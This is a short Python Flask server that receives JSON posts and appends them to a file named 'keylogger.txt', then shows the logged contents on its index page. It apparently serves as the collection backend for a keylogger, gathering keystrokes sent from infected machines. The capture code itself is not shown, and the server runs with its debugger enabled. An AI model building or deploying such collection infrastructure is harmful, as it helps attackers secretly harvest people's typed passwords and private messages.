from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Check if the request data is JSON
        if request.is_json:
            try:
                data = request.get_json()
                # Write JSON data to a file
                with open('keylogger.txt', 'a') as file:
                    file.write(str(data) + '\n')
                return 'Data received and saved successfully!'
            except Exception as e:
                return f'Error: {str(e)}', 400
        else:
            return 'Request data is not in JSON format!', 400
    else:
        # Read the contents of the keylogger.txt file
        try:
            with open('keylogger.txt', 'r') as file:
                contents = file.read()
            return render_template('index.html', contents=contents)
        except FileNotFoundError:
            return 'No data found yet.'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
